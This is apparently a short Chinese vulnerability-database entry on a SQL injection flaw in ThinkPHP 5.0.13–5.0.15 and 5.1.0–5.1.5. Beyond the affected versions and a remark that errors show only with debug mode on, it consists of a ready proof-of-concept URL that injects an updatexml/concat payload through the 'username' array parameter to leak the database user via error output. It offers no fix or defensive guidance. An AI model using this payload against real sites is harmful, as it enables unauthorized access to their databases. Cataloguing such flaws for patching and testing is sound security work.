---
title: 'Thinkphp 5.0.(13-15)&5.1.(0-5) sql注入漏洞'
date: Sat, 03 Oct 2020 16:23:53 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞影响

5.0.13<=ThinkPHP<=5.0.15 5.1.0<=ThinkPHP<=5.1.5

### 漏洞POC

没开启debug看不到报错信息```
http://*********/index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1 

